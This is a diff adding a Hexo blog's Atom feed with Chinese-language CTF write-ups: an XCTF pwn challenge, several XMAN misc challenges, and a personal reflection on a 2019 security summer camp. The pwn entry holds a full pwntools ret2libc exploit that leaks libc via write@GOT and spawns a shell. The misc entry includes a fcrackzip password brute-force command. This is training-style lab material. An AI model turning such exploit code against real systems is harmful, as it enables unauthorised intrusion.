@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>faint-star</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2019-08-15T15:46:22.777Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>John Doe</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XCTF-PWN</title>
+    <link href="http://yoursite.com/2019/08/15/XCTF-PWN/"/>
+    <id>http://yoursite.com/2019/08/15/XCTF-PWN/</id>
+    <published>2019-08-15T14:34:34.000Z</published>
+    <updated>2019-08-15T15:46:22.777Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c++</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7u);</span><br><span class="line">  return read(0, &amp;buf, 256u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(0x100)</span></span><br><span class="line">io = process(<span class="string">'./level3'</span>)</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45330</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048484</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">'write:'</span>+hex(write))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>, write)</span><br><span class="line">system = write + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">"write"</span>)      <span class="comment">#system offset</span></span><br><span class="line">bin_sh = write + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">"write"</span>)   <span class="comment">#/bin/sh offset</span></span><br><span class="line">info(<span class="string">'system:'</span>+hex(system))</span><br><span class="line">info(<span class="string">'/bin/sh:'</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x8c</span>*<span class="string">'b'</span>+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>调试技巧:</strong></p><p>在read处按下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">断点下在 ```0x08048482``` 处</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure></p><p>python里加上调试语句，python脚本运行时会自动打开<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line"># gdb.attach(io)</span><br></pre></td></tr></table></figure></p><p>但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">io.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"># pause()</span><br><span class="line">io.sendline(payload1)</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure><p>在填充至返回地址的时候，可以用<code>gdb</code>跟踪到ret指令处，此时查看<code>$esp</code>寄存器的内容，可以检查自己的地址是否填正确。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;level3&quot;&gt;&lt;a href=&quot;#level3&quot; class=&quot;headerlink&quot; title=&quot;level3&quot;&gt;&lt;/a&gt;level3&lt;/h2&gt;&lt;p&gt;漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者&lt;figure class=&quot;highli
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>xman-misc</title>
+    <link href="http://yoursite.com/2019/08/12/xman-misc/"/>
+    <id>http://yoursite.com/2019/08/12/xman-misc/</id>
+    <published>2019-08-12T10:14:10.000Z</published>
+    <updated>2019-08-12T12:09:27.559Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="cephalopod"><a href="#cephalopod" class="headerlink" title="cephalopod"></a>cephalopod</h2><p>题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png" alt="ceph1" title>                </div>                <div class="image-caption">ceph1</div>            </figure><p>追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858798-e71b1300-bd2d-11e9-8ce1-dc3a0862ac22.png" alt="ceph2" title>                </div>                <div class="image-caption">ceph2</div>            </figure><p>linux下使用tcpxtract分离，其中一张图片即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap</span><br></pre></td></tr></table></figure><h2 id="Erik-Baleog-and-Olaf"><a href="#Erik-Baleog-and-Olaf" class="headerlink" title="Erik-Baleog-and-Olaf"></a>Erik-Baleog-and-Olaf</h2><p>压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare hint.png stego100.png -compose src diff.png</span><br></pre></td></tr></table></figure><p>hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可</p><h2 id="Miscellaneous-300"><a href="#Miscellaneous-300" class="headerlink" title="Miscellaneous-300"></a>Miscellaneous-300</h2><p>一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys,zipfile</span><br><span class="line">original_file=<span class="string">'12475.zip'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    original_file = zipfile.ZipFile(original_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'zip'</span> <span class="keyword">in</span> original_file.namelist()[<span class="number">0</span>]:</span><br><span class="line">        inner_zipfile = original_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        original_file_password = inner_zipfile[:inner_zipfile.find(<span class="string">'.'</span>)]</span><br><span class="line">        original_file.setpassword(original_file_password)</span><br><span class="line">        original_file.extractall()</span><br><span class="line">        os.remove(original_file.filename)</span><br><span class="line">        original_file = inner_zipfile</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>到最后一层12475.zip无法解压了，这个时候进行爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -l 1-6 -c 'a1' 12475.zip</span><br></pre></td></tr></table></figure><ul><li>-u：使用unzip解压</li><li>-l：后面接长度范围</li><li>-c：后接字符，a为所有小写字母，1是数字[0-9]</li></ul><h2 id="小小的PDF"><a href="#小小的PDF" class="headerlink" title="小小的PDF"></a>小小的PDF</h2><p>打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i 2333.pdf -o test</span><br></pre></td></tr></table></figure><p>foremost是基于文件头及尾部信息恢复文件的工具。</p><h2 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h2><ul><li><a href="https://chybeta.github.io/2017/08/25/流量包提取文件方法/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/</a></li><li><a href="https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf</a></li><li><a href="https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300" target="_blank" rel="noopener">https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;cephalopod&quot;&gt;&lt;a href=&quot;#cephalopod&quot; class=&quot;headerlink&quot; title=&quot;cephalopod&quot;&gt;&lt;/a&gt;cephalopod&lt;/h2&gt;&lt;p&gt;题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>XMAN-2019-福州营</title>
+    <link href="http://yoursite.com/2019/08/11/xman/"/>
+    <id>http://yoursite.com/2019/08/11/xman/</id>
+    <published>2019-08-11T09:55:59.000Z</published>
+    <updated>2019-08-12T03:06:33.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
